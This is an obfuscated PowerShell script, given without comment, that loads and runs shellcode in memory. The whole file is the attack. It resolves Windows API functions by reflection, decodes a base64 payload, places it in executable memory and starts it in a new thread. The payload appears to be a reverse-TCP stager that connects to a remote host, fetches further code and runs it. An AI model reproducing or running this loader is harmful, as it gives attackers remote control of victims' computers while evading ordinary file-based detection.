function wViE {
	Param ($pe, $kJ9)		
	$o9FM = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $o9FM.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($o9FM.GetMethod('GetModuleHandle')).Invoke($null, @($pe)))), $kJ9))
}

function qS {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $qqBgj,
		[Parameter(Position = 1)] [Type] $hSD4z = [Void]
	)
	
	$pVm = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$pVm.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $qqBgj).SetImplementationFlags('Runtime, Managed')
	$pVm.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $hSD4z, $qqBgj).SetImplementationFlags('Runtime, Managed')
	
	return $pVm.CreateType()
}

[Byte[]]$kd = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG7LU31+EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$quGK = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((wViE kernel32.dll VirtualAlloc), (qS @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $kd.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($kd, 0, $quGK, $kd.length)

$kYd7z = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((wViE kernel32.dll CreateThread), (qS @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$quGK,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((wViE kernel32.dll WaitForSingleObject), (qS @([IntPtr], [Int32]))).Invoke($kYd7z,0xffffffff) | Out-Null
